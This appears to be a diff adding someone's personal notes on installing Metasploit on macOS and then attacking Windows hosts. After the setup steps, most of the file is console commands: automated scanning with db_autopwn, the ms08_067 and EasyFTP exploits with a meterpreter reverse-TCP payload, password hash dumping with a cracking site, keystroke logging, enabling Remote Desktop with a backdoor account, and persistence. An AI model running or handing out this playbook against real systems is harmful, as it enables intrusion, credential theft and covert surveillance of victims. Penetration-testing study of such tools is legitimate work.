@@ -1,0 +1,100 @@
+Install Xcode from the App Store
+Install MacPorts from http://www.mapcports.org
+
+sudo port selfupdate
+sudo port upgrade outdated
+
+sudo port install ruby19
+
+svn co https://metasploit.com/svn/framework3/trunk msf3
+
+#sudo env PATH=/opt/local/lib/postgresql84/bin:$PATH
+sudo port install postgresql84-server
+sudo mkdir -p /opt/local/lib/postgresql84/data
+sudo chown postgres:postgres /opt/local/lib/postgresql84/data
+sudo su postgres -c '/opt/local/lib/postgresql84/bin/initdb -D /opt/local/lib/postgresql84/data'
+sudo su postgres -c '/opt/local/lib/postgresql84/bin/postgres -D /opt/local/lib/postgresql84/data &'
+
+
+su - postgres
+createuser -d -a -P root
+
+
+in metasploit:
+db_connect postgres:"<passworrd from above>"@127.0.0.1/"msf3"
+db_nmap -T4 -p1-65535 192.168.0.107    # -sT -P0 if using as root
+db_autopwn -p -t -e
+
+
+sudo gem install pg
+
+
+************************************
+
+sudo ./msfconsole
+use exploit/windows/smb/ms08_067_netapi
+show options
+set RHOST 10.1.1.1
+show options
+show payloads
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.1.1.2
+exploit
+
+sysinfo
+getuid
+ps
+run checkvm
+run winenum
+
+run metsvc
+ show services 
+
+execute -f cmd.exe -i -t
+
+hashdump
+ Site for cracking password hashes up to 14 characters instantly:
+	https://www.objectif-securite.ch/en/products.php
+
+
+KeyStroke Logging:
+ps
+migrate <pid of explorer.exe>
+keyscan_start
+ type stuff in
+keyscan_dump
+keyscan_stop
+
+execute -f cmd.exe -i -t
+
+The getgui script will enable Remote Desktop, open firewall ports and 
+ create a user account for us to login with.  From a meterpreter console:
+ run getgui -u hax0r -p 31337
+
+run gettelnet -e
+
+
+use exploit/windows/smb/ms08_067_netapi
+show options
+set RHOST 10.1.1.1
+show options
+show payloads
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.1.1.2
+exploit
+
+
+use priv -> explain command
+
+
+
+
+
+
+use exploit/windows/ftp/easyftp_cwd_fixret
+set payload windows/meterpreter/reverse_tcp
+
+
+
+
+
